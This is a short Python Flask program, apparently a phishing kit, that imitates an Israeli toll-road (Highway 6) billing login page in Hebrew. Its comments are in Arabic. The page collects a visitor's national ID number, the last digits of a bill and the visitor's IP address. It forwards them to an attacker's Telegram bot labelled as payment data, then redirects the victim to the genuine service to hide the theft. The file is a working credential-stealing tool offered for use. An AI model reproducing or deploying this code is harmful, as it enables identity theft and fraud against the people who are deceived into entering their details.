import os
import requests
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# الإعدادات من Render
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = os.environ.get('DEVELOPER_ID')

HTML_PAGE = '''
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>כניסה לשירות</title>
    <style>
        body {
            margin: 0; padding: 0;
            background: url('https://raw.githubusercontent.com/cobra250300-cyber/cobra/main/1000197973.jpg') no-repeat center top;
            background-size: 400px; /* ضبط الحجم ليتناسب مع الموبايل */
            font-family: sans-serif;
            background-color: #f4f4f4;
        }
        .container { position: relative; width: 400px; margin: 0 auto; height: 800px; }
        
        /* ضبط أماكن الحقول فوق الصورة بدقة */
        input {
            position: absolute;
            width: 320px;
            height: 35px;
            right: 40px;
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 5px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.8);
        }
        .id-field { top: 310px; } /* مكان رقم الهوية */
        .bill-field { top: 525px; } /* مكان رقم الفاتورة */
        
        button {
            position: absolute;
            top: 600px;
            right: 40px;
            width: 320px;
            height: 50px;
            background: transparent;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <form method="POST" action="/send">
            <input type="text" name="id_num" class="id-field" placeholder="מספר ת.ז" required>
            <input type="text" name="bill_num" class="bill-field" placeholder="6 ספרות אחרונות" required>
            <button type="submit"></button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/send', methods=['POST'])
def send():
    id_num = request.form.get('id_num')
    bill_num = request.form.get('bill_num')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    msg = (
        f"💳 **[بيانات دفع جديدة - عبري]**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🆔 **رقم الهوية:** `{id_num}`\n"
        f"🧾 **رقم الفاتورة:** `{bill_num}`\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 **IP:** `{user_ip}`"
    )
    
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      data={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
    except: pass
    
    # تحويل لصفحة حقيقية بعد الانتهاء
    return redirect("https://www.service.kvish6.co.il")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
